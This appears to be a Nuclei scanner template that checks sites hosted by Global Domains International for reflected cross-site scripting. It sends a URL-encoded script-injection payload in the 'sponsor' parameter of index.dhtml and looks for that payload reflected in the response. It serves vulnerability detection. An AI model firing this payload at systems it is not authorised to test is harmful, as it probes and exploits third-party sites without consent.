http:
- matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/index.dhtml?sponsor=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
id: global-domains-xss
info:
  author: princechaddha
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  description: 'Sites hosted by Global Domains International, Inc. have cross-site
    scripting and directory traversal vulnerabilities.

    '
  metadata:
    max-request: 1
  name: Global Domains International - Cross-Site Scripting
  reference:
  - https://cxsecurity.com/issue/WLB-2018020247
  - https://packetstormsecurity.com/files/126545/Global-Domains-International-Cross-Site-Scripting-Traversal.html
  severity: high
  tags: globaldomains,xss,packetstorm,vuln
